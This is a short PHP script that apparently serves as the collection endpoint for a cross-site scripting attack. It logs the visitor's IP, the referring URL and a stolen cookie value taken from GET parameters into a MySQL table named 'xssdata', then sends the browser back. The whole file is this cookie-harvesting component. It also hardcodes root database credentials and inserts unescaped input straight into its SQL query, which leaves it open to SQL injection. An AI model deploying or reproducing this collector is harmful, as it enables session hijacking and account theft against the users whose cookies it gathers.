<?php

$ipaddr = $_SERVER['REMOTE_ADDR'];
$url =$_GET['referer'];
$value = $_GET['value'];

$conn=new mysqli('127.0.0.1','root','123456','learn')or die("数据库连接不成功.");
$conn->set_charset("utf8");
$sql = "insert into xssdata(ipaddr, url, cookie, createtime) values('$ipaddr', '$url', '$value', now())";
$conn->query($sql);

echo "<script>history.back();</script>";
//echo "<script>location.href='http://www.woniunote.com/'</script>";